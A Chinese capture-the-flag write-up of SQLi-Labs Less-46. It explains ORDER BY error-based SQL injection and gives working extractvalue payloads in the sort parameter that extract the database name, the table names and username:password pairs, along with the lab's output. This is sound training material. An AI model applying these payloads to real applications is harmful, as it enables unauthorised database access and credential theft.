【SQLi-Labs】Less-46 ORDER BY 报错注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, ORDER BY注入, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-46 (GET - Error Based - Numeric - ORDER BY)
  • 提示：注入点为 sort 参数，纯数字型 ORDER BY $id，有报错回显。

2. 核心原理：ORDER BY 注入

本关卡将注入点从 WHERE 转移到了 ORDER BY。由于 SQL 语法限制，ORDER BY 后面不能接 UNION，也无法直接进行联合查询。

因为源码是纯数字型 ORDER BY $id，用户输入会被当作表达式直接执行。因此，利用 extractvalue() 或 updatexml() 构造非法的 XPath 路径，引发报错，是提取数据的最佳手段。

3. 操作步骤与解析

第一步：报错爆库名

输入 URL：?sort=extractvalue(1,concat(0x7e,database()))

回显现象：XPATH syntax error: '~security'。

第二步：报错爆表名

输入 URL：?sort=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))

回显现象：~emails,referers,uagents,users。

第三步：分段获取账号密码

由于 extractvalue 报错限制为 32 字符，需使用 substr 截取。

输入 URL：?sort=extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x3a,password),1,30) from users)))

回显现象：~Dumb:Dumb,Angelina:I-kill-you,。

4. 踩坑记录与复盘

  • UNION 失效：必须清晰认识到 ORDER BY 语法的局限性，及时切换为报错注入。
  • 长度截断：遇到长数据时，利用 substr 调整起始位置（如把 1 改成 31）来分段提取。

5. 知识点总结

  • ORDER BY 注入：针对排序字段的注入，核心在于利用表达式执行特性（纯数字型）进行报错或盲注。
  • 报错注入的发挥空间：在不支持联合查询的场景下，报错注入是获取数据最迅速的方式。
